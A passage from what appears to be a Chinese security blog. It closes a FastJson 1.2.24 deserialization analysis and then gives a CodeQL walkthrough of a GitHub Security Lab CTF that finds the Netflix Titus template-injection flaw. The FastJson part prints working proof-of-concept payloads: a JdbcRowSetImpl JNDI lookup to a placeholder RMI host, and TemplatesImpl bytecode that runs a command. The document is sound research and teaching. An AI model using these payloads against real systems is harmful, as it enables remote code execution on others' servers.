<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;dataSourceName\&quot;:\&quot;rmi://ip:9999/Evil\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;autoCommit\&quot;:true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200219213725909.png" alt="image-20200219213725909"></p>
<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>还是先放上POC，关于<code>TemplatesImpl</code>的构造在学习JDK7u21Gadgets时已经接触过了 <a href="/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/#TemplatesImpl">JDK7u21反序列化Gadgets</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;); &#125;&quot;</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);<span class="comment">//添加构造函数</span></span><br><span class="line">        <span class="type">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line"></span><br><span class="line">        String evilCode=Base64.encodeBase64String(byteCode);</span><br><span class="line"></span><br><span class="line">        String poc=<span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span>+TemplatesImpl.class.getName()+<span class="string">&quot;\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_name\&quot;:\&quot;xx\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_tfactory\&quot;:&#123; &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(poc);</span><br><span class="line"></span><br><span class="line">        JSON.parse(poc,Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中还有几点需要梳理一下</p>
<h3 id="Feature-SupportNonPublicField"><a href="#Feature-SupportNonPublicField" class="headerlink" title="Feature.SupportNonPublicField"></a>Feature.SupportNonPublicField</h3><p>在漏洞触发时必须传入<code>Feature.SupportNonPublicField</code>参数，这也成了该条利用链的限制，导致不是很通用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSON.parse(poc,Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure>

<p>这是因为POC中有一些private属性，而且<code>TemplatesImpl</code>类中没有相应的set方法，所以需要传入该参数让其支持非public属性，当然如果private属性存在相应set方法的话，FastJson会自动调用其set方法完成赋值，不需要<code>Feature.SupportNonPublicField</code>参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String json=<span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;l3yx\&quot;,\&quot;age\&quot;:20&#125;&quot;</span>;</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        Person person1=JSON.parseObject(json,Person.class, Feature.SupportNonPublicField);</span><br><span class="line">        Person person2=JSON.parseObject(json,Person.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(person1);</span><br><span class="line">        System.out.println(person2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    Person()&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    Person(<span class="type">int</span> age,String name)&#123;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200223160652206.png" alt="image-20200223160652206"></p>
<h3 id="outputProperties"><a href="#outputProperties" class="headerlink" title="_outputProperties"></a>_outputProperties</h3><p>FastJson对变量赋值的逻辑在<code>parseField</code>中实现</p>
<p>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</p>
<p><img src="/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200224223227988.png" alt="image-20200224223227988"></p>
<p>key即为传入的属性名，经过了<code>smartMatch</code>处理</p>
<p>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch</p>
<p><img src="/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200224223344199.png" alt="image-20200224223344199"></p>
<p>会替换掉字段key中的<code>_</code>和<code>-</code>，从而 <code>_outputProperties</code> 和 <code>getOutputProperties()</code> 可以成功关联上</p>
<p>所以删除掉POC中的<code>_</code>也是没有影响的</p>
<h3 id="bytecodes"><a href="#bytecodes" class="headerlink" title="_bytecodes"></a>_bytecodes</h3><p><code>_bytecodes</code>参数是以base64编码传入的，FastJson提取byte[]数组字段值时会进行Base64解码</p>
<p>com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</p>
<p><img src="/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200224225749312.png" alt="image-20200224225749312"></p>
<p>com.alibaba.fastjson.parser.JSONScanner#bytesValue</p>
<p><img src="/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200224225821135.png" alt="image-20200224225821135"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/cyeEAv31GO_hZCTXVRBkxw">深入理解JNDI注入与Java反序列化漏洞利用</a></p>
<p><a href="https://www.freebuf.com/vuls/178012.html">Fastjson 1.2.24反序列化漏洞分析</a></p>
<p><a href="https://xz.aliyun.com/t/7027">JAVA反序列化 - FastJson组件</a></p>
<p><a href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/">fastjson 1.2.24 反序列化导致任意命令执行漏洞</a></p>
<p><a href="https://paper.seebug.org/994/">Fastjson 流程分析及 RCE 分析</a></p>
<p><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">FastJson 反序列化学习</a></p>
]]></content>
      <tags>
        <tag>Java反序列化漏洞</tag>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>GitHub Security Lab CTF: CodeQL and Chill</title>
    <url>/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/</url>
    <content><![CDATA[<p>这是GitHub Security Lab CTF的一道<a href="https://securitylab.github.com/ctf/codeql-and-chill/">题目</a>，利用CodeQL挖掘<a href="https://securitylab.github.com/advisories/GHSL-2020-028-netflix-titus/">Netflix Titus服务端模板注入</a>漏洞。</p>
<span id="more"></span>

<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>JSR是<code>Java Specification Requests</code>的缩写，意思是Java 规范提案。<a href="https://jcp.org/en/jsr/detail?id=380">JSR380</a>是关于数据校验这块的，也就是JSR第380号标准。Netflix Titus使用Java Bean Validation (JSR 380) 规范自定义了约束验证器，如<code>com.netflix.titus.api.jobmanager.model.job.sanitizer.SchedulingConstraintSetValidator</code></p>
<p><a href="https://github.com/Netflix/titus-control-plane/blob/8a8bd4c1b4b63e17520804c6f7f6278252bf5a5b/titus-api/src/main/java/com/netflix/titus/api/jobmanager/model/job/sanitizer/SchedulingConstraintSetValidator.java"><code>SchedulingConstraintSetValidator.java</code></a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SchedulingConstraintSetValidator</span> <span class="keyword">implements</span> <span class="title class_">ConstraintValidator</span>&lt;SchedulingConstraintSetValidator.SchedulingConstraintSet, Container&gt; &#123;</span><br><span class="line">		...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(Container container, ConstraintValidatorContext context)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (container == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;String&gt; common = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(container.getSoftConstraints().keySet());</span><br><span class="line">        common.retainAll(container.getHardConstraints().keySet());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (common.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        context.buildConstraintViolationWithTemplate(</span><br><span class="line">                <span class="string">&quot;Soft and hard constraints not unique. Shared constraints: &quot;</span> + common</span><br><span class="line">        ).addConstraintViolation().disableDefaultConstraintViolation();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<a href="https://beanvalidation.org/2.0-jsr380/">Bean Validation 2.0 规范</a>可知在构建违反约束的错误信息时，可以插入多种类型的值，包括<a href="https://docs.jboss.org/hibernate/validator/5.1/reference/en-US/html/chapter-message-interpolation.html#section-interpolation-with-message-expressions">Java EL 表达式</a>。因此如果<code>ConstraintValidatorContext.buildConstraintViolationWithTemplate()</code>的第一个参数即错误信息模板被攻击者可控，就有可能导致任意代码执行，即<a href="https://securitylab.github.com/advisories/GHSL-2020-028-netflix-titus/">CVE-2020-9297</a>。这些错误信息模板就是注入漏洞的sink。经过验证的bean属性通常会流入自定义错误信息，这些就是source。</p>
<h2 id="数据流和污点跟踪分析"><a href="#数据流和污点跟踪分析" class="headerlink" title="数据流和污点跟踪分析"></a>数据流和污点跟踪分析</h2><p>首先下载存在漏洞的版本<a href="https://github.com/Netflix/titus-control-plane/commit/8a8bd4c1b4b63e17520804c6f7f6278252bf5a5b"><code>8a8bd4c</code></a>对应的<a href="https://drive.google.com/open?id=10ju0t2QZjsKI8qrAqwzsPA3K-lBgqPVF">CodeQL数据库</a>。</p>
<h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p>题目已经提示source是上文代码中<code>isValid</code>方法的第一个参数，我们要找的<code>isValid</code>方法其实是对<code>ConstraintValidator</code>接口的具体实现，首先抽象出该接口：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class ConstraintValidator extends Interface&#123;</span><br><span class="line">    ConstraintValidator()&#123;</span><br><span class="line">        this.hasQualifiedName(&quot;javax.validation&quot;, &quot;ConstraintValidator&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>抽象出<code>isValid</code>方法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class AbstractIsValid extends <span class="keyword">Method</span>&#123;</span><br><span class="line">    AbstractIsValid()&#123;</span><br><span class="line">        this.getDeclaringType() instanceof ConstraintValidator <span class="keyword">and</span></span><br><span class="line">        this.hasName(&quot;isValid&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class IsValid extends <span class="keyword">Method</span>&#123;</span><br><span class="line">    IsValid()&#123;</span><br><span class="line">        <span class="keyword">exists</span>(AbstractIsValid abstractIsValid <span class="operator">|</span> this.overridesOrInstantiates<span class="operator">*</span>(abstractIsValid) )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>确定source：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">predicate isSource(DataFlow::Node source) &#123; </span><br><span class="line">    <span class="keyword">exists</span>(IsValid isValid <span class="operator">|</span> source.asParameter() <span class="operator">=</span> isValid.getParameter(<span class="number">0</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Sink"><a href="#Sink" class="headerlink" title="Sink"></a>Sink</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class ConstraintValidatorContext extends RefType &#123;</span><br><span class="line">    ConstraintValidatorContext()&#123;</span><br><span class="line">        this.hasQualifiedName(&quot;javax.validation&quot;,&quot;ConstraintValidatorContext&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class BuildConstraintViolationWithTemplate extends <span class="keyword">Method</span> &#123;</span><br><span class="line">    BuildConstraintViolationWithTemplate()&#123;</span><br><span class="line">        this.getDeclaringType().getASupertype<span class="operator">*</span>() instanceof  ConstraintValidatorContext <span class="keyword">and</span></span><br><span class="line">        this.hasName(&quot;buildConstraintViolationWithTemplate&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate isSink(DataFlow::Node sink) &#123; </span><br><span class="line">    <span class="keyword">exists</span>(MethodAccess methodAccess <span class="operator">|</span> </span><br><span class="line">        methodAccess.getCallee() instanceof  BuildConstraintViolationWithTemplate <span class="keyword">and</span></span><br><span class="line">        methodAccess.getArgument(<span class="number">0</span>) <span class="operator">=</span> sink.asExpr()</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="污点跟踪"><a href="#污点跟踪" class="headerlink" title="污点跟踪"></a>污点跟踪</h3><p>完整代码：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class ConstraintValidator extends Interface&#123;</span><br><span class="line">    ConstraintValidator()&#123;</span><br><span class="line">        this.hasQualifiedName(&quot;javax.validation&quot;, &quot;ConstraintValidator&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class AbstractIsValid extends <span class="keyword">Method</span>&#123;</span><br><span class="line">    AbstractIsValid()&#123;</span><br><span class="line">        this.getDeclaringType() instanceof ConstraintValidator <span class="keyword">and</span></span><br><span class="line">        this.hasName(&quot;isValid&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class IsValid extends <span class="keyword">Method</span>&#123;</span><br><span class="line">    IsValid()&#123;</span><br><span class="line">        <span class="keyword">exists</span>(AbstractIsValid abstractIsValid <span class="operator">|</span> this.overridesOrInstantiates<span class="operator">*</span>(abstractIsValid) )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ConstraintValidatorContext extends RefType &#123;</span><br><span class="line">    ConstraintValidatorContext()&#123;</span><br><span class="line">        this.hasQualifiedName(&quot;javax.validation&quot;,&quot;ConstraintValidatorContext&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class BuildConstraintViolationWithTemplate extends <span class="keyword">Method</span> &#123;</span><br><span class="line">    BuildConstraintViolationWithTemplate()&#123;</span><br><span class="line">        this.getDeclaringType().getASupertype<span class="operator">*</span>() instanceof  ConstraintValidatorContext <span class="keyword">and</span></span><br><span class="line">        this.hasName(&quot;buildConstraintViolationWithTemplate&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    MyTaintTrackingConfig() &#123; this <span class="operator">=</span> &quot;MyTaintTrackingConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(IsValid isValid <span class="operator">|</span> source.asParameter() <span class="operator">=</span> isValid.getParameter(<span class="number">0</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(MethodAccess methodAccess <span class="operator">|</span> </span><br><span class="line">            methodAccess.getCallee() instanceof  BuildConstraintViolationWithTemplate <span class="keyword">and</span></span><br><span class="line">            methodAccess.getArgument(<span class="number">0</span>) <span class="operator">=</span> sink.asExpr()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MyTaintTrackingConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"><span class="keyword">where</span> cfg.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;Custom constraint error message contains unsanitized user data&quot;</span><br></pre></td></tr></table></figure>

<p>查询结果为0。</p>
<h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>目前source和sink点都已经明确，结果为0则说明从source到sink的路径上缺少了一步。CodeQL提供了<code>partial data flow</code>来进行Debug，这个功能可以查找从给定的source到任何可能的sink的流，让sink不受限制，同时限制从<code>source</code>到<code>sink</code>的搜索步骤的数量。因此可以使用这个功能来跟踪污点从source到所有可能的sink的流向，并查看流在哪一步不再被进一步跟踪。</p>
<blockquote>
<p><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/dataflow/internal/DataFlowImpl2.qll/predicate.DataFlowImpl2$Configuration$hasPartialFlow.3.html">predicate hasPartialFlow(PartialPathNode source, PartialPathNode node, int dist)</a></p>
<p>如果存在从<code>source</code>到<code>node</code>的部分数据流路径，则成立。<code>node</code>与最近的<code>source</code>之间的近似距离是<code>dist</code>并且被限制为小于或等于<code>explorationLimit()</code>。该谓词完全无视<code>sink</code>的定义。</p>
<p>此谓词旨在用于数据流探索和调试，如果<code>sourece</code>数量太多或者<code>explorationLimit</code>设置得太高则可能会表现不佳。</p>
<p>默认情况下禁用此谓词（没有结果）。用合适的数字覆盖 <code>explorationLimit()</code>以启用此谓词。</p>
<p>要在<code>path-problem</code>查询中使用它，请导入模块<code>PartialPathGraph</code>。</p>
</blockquote>
<p>使用模板如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** @kind path-problem */</span></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PartialPathGraph <span class="operator">/</span><span class="operator">/</span> this <span class="keyword">is</span> different<span class="operator">!</span></span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    MyTaintTrackingConfig() &#123; ... &#125; <span class="operator">/</span><span class="operator">/</span> same <span class="keyword">as</span> before</span><br><span class="line">    override predicate isSource(DataFlow::Node source) &#123; ... &#125; <span class="operator">/</span><span class="operator">/</span> same <span class="keyword">as</span> before</span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123; ... &#125; <span class="operator">/</span><span class="operator">/</span> same <span class="keyword">as</span> before</span><br><span class="line">    override <span class="type">int</span> explorationLimit() &#123; <span class="keyword">result</span> <span class="operator">=</span>  <span class="number">10</span>&#125; <span class="operator">/</span><span class="operator">/</span> this <span class="keyword">is</span> different<span class="operator">!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">from</span> MyTaintTrackingConfig cfg, DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  cfg.hasPartialFlow(source, sink, _) <span class="keyword">and</span></span><br><span class="line">  source.getNode() <span class="operator">=</span> ... <span class="operator">/</span><span class="operator">/</span> TODO restrict <span class="keyword">to</span> the <span class="keyword">one</span> source we <span class="keyword">are</span> interested <span class="keyword">in</span>, <span class="keyword">for</span> ease <span class="keyword">of</span> debugging</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;Partial flow from unsanitized user data&quot;</span><br><span class="line"></span><br><span class="line">predicate partial_flow(PartialPathNode n, Node src, <span class="type">int</span> dist) &#123;</span><br><span class="line">  <span class="keyword">exists</span>(MyTaintTrackingConfig conf, PartialPathNode source <span class="operator">|</span></span><br><span class="line">    conf.hasPartialFlow(source, n, dist) <span class="keyword">and</span></span><br><span class="line">    src <span class="operator">=</span> source.getNode() <span class="keyword">and</span></span><br><span class="line">    source <span class="operator">=</span>  <span class="operator">/</span><span class="operator">/</span> TODO <span class="operator">-</span> restrict <span class="keyword">to</span> THE source we <span class="keyword">are</span> interested <span class="keyword">in</span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整代码（注意<code>DataFlow::PathGraph</code>和<code>DataFlow::PartialPathGraph</code>不能同时导入）：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>import DataFlow::PathGraph</span><br><span class="line">import DataFlow::PartialPathGraph</span><br><span class="line"></span><br><span class="line">class ConstraintValidator extends Interface&#123;</span><br><span class="line">    ConstraintValidator()&#123;</span><br><span class="line">        this.hasQualifiedName(&quot;javax.validation&quot;, &quot;ConstraintValidator&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class AbstractIsValid extends <span class="keyword">Method</span>&#123;</span><br><span class="line">    AbstractIsValid()&#123;</span><br><span class="line">        this.getDeclaringType() instanceof ConstraintValidator <span class="keyword">and</span></span><br><span class="line">        this.hasName(&quot;isValid&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class IsValid extends <span class="keyword">Method</span>&#123;</span><br><span class="line">    IsValid()&#123;</span><br><span class="line">        <span class="keyword">exists</span>(AbstractIsValid abstractIsValid <span class="operator">|</span> this.overridesOrInstantiates<span class="operator">*</span>(abstractIsValid) )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ConstraintValidatorContext extends RefType &#123;</span><br><span class="line">    ConstraintValidatorContext()&#123;</span><br><span class="line">        this.hasQualifiedName(&quot;javax.validation&quot;,&quot;ConstraintValidatorContext&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class BuildConstraintViolationWithTemplate extends <span class="keyword">Method</span> &#123;</span><br><span class="line">    BuildConstraintViolationWithTemplate()&#123;</span><br><span class="line">        this.getDeclaringType().getASupertype<span class="operator">*</span>() instanceof  ConstraintValidatorContext <span class="keyword">and</span></span><br><span class="line">        this.hasName(&quot;buildConstraintViolationWithTemplate&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    MyTaintTrackingConfig() &#123; this <span class="operator">=</span> &quot;MyTaintTrackingConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(IsValid isValid <span class="operator">|</span> source.asParameter() <span class="operator">=</span> isValid.getParameter(<span class="number">0</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(MethodAccess methodAccess <span class="operator">|</span> </span><br><span class="line">            methodAccess.getCallee() instanceof  BuildConstraintViolationWithTemplate <span class="keyword">and</span></span><br><span class="line">            methodAccess.getArgument(<span class="number">0</span>) <span class="operator">=</span> sink.asExpr()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override <span class="type">int</span> explorationLimit() &#123; <span class="keyword">result</span> <span class="operator">=</span>  <span class="number">3</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MyTaintTrackingConfig cfg, DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    cfg.hasPartialFlow(source, sink, _) <span class="keyword">and</span></span><br><span class="line">    source.getNode().asParameter().getName() <span class="operator">=</span> &quot;container&quot;</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;Partial flow from unsanitized user data&quot;</span><br><span class="line"></span><br><span class="line">predicate partial_flow(DataFlow::PartialPathNode n, DataFlow::Node src, <span class="type">int</span> dist) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(MyTaintTrackingConfig conf, DataFlow::PartialPathNode source <span class="operator">|</span></span><br><span class="line">        conf.hasPartialFlow(source, n, dist) <span class="keyword">and</span></span><br><span class="line">        src <span class="operator">=</span> source.getNode() <span class="keyword">and</span></span><br><span class="line">        source.getNode().asParameter().getName() <span class="operator">=</span> &quot;container&quot;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试发现污点确实是到了预期的地方的</p>
<p><img src="/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/image-20220515222307815.png" alt="image-20220515222307815"></p>
<p>这与题目中CodeQL不会通过getter传播污染的描述不符，猜测可能是我当前用的最新版引擎（v2.9.1）已经支持这类方法的污点自动传播了。</p>
<blockquote>
<p>You must have found that CodeQL does not propagate taint through getters like <code>container.getHardConstraints</code> and <code>container.getSoftConstraints</code>. Can you guess why this default behaviour was implemented?</p>
</blockquote>
